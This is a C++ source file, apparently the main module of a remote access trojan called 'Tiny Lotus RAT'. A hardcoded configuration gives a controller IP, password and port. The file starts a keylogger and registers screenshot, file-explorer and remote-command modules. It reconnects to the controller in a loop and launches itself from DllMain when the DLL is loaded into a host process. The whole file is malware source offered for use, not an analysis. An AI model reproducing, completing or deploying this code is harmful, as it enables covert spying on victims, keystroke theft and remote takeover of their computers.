#include "main.h"

/*
########################################################################################################################
#    Tiny Lotus RAT                                                                                                    #
#    Coded by Elvis                                                                                                    #
#    For private using only                                                                                            #
#    https://akruis.bitbucket.io/weblog%20-%20anselm-kruis.de/2012-06-03%20MSVCRT.DLL%20and%20Visual%20Studio.xhtml    #
########################################################################################################################
*/

Connection*		ConnObj				= NULL;
ObjMgr*			ObjList				= NULL;
RemoteCommand*	CmdObj				= NULL;
Info*			InfoObj				= NULL;
Keylogger*		KeyloggerObj		= NULL;
FileExplorer*	FileExplorerObj		= NULL;
Screenshot*		ScreenshotObj		= NULL;
Switch*			SwitchObj			= NULL;

struct config conf = {{0xCAFEBABE, 0xDEADBABE},L"ALPHA TEST","192.168.139.1", "lazydog", 6969};

bool Init()
{

	//Connection class
	ConnObj = new Connection(conf.hostIP, conf.port);


	//Create new obj list
	ObjList = new ObjMgr();

	//Register default obj
	CmdObj = new RemoteCommand(ConnObj);
	ObjList->RegisterObj(CmdObj);
	InfoObj = new Info(ConnObj, &conf);
	ObjList->RegisterObj(InfoObj);
	KeyloggerObj = new Keylogger(ConnObj);
	ObjList->RegisterObj(KeyloggerObj);
	KeyloggerObj->Start();
	FileExplorerObj = new FileExplorer(ConnObj);
	ObjList->RegisterObj(FileExplorerObj);
	ScreenshotObj = new Screenshot(ConnObj);
	ObjList->RegisterObj(ScreenshotObj);
	SwitchObj = new Switch(ConnObj, conf.password);
	ObjList->RegisterObj(SwitchObj);

	return true;
}

#define INIT_PACKET_BUFFER_SIZE		0x2000

bool Update()
{
	while(1)
	{
		while (!ConnObj->IsConnected() && !SwitchObj->IsCloseSignature())
			while(!ConnObj->Connect())
				Sleep(2000);

		//The skeleton
		BYTE* packetData = (BYTE*)malloc(INIT_PACKET_BUFFER_SIZE);
		size_t packetSize = INIT_PACKET_BUFFER_SIZE;
		while (ConnObj->IsConnected() && !SwitchObj->IsCloseSignature())
		{
			if (ConnObj->RecvRawPacket(packetData, &packetSize))
			{
				ObjList->OnPacketArrived(packetData, 0);
			}
			Sleep(100);
		}
		free(packetData);

		if (!SwitchObj->IsCloseSignature())
			break;
	}
	return true;
}

bool Finish()
{
	if (ConnObj->IsConnected())
		ConnObj->CloseConnection();

	ObjList->OnExit();
	ObjList->ClearObjList(); //Clear but not free obj
	delete SwitchObj;			SwitchObj		= NULL;
	delete ScreenshotObj;		ScreenshotObj	= NULL;
	delete FileExplorerObj;		FileExplorerObj = NULL;
	delete KeyloggerObj;		KeyloggerObj	= NULL;
	delete InfoObj;				InfoObj			= NULL;
	delete CmdObj;				CmdObj			= NULL;
	delete ObjList;				ObjList			= NULL;
	delete ConnObj;				ConnObj			= NULL;
	return true;
}

void MainThread()
{
	if (!Init())
		return;
	Update();
	Finish();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	// Perform actions based on the reason for calling.
    switch( fdwReason )
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MainThread, NULL, NULL, NULL);        
        break;
    case DLL_THREAD_ATTACH:        
        // Do thread-specific initialization.
        break;        
    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.            
        break;
    case DLL_PROCESS_DETACH:        
        // Perform any necessary cleanup.
        break;    
    }
    return TRUE;
}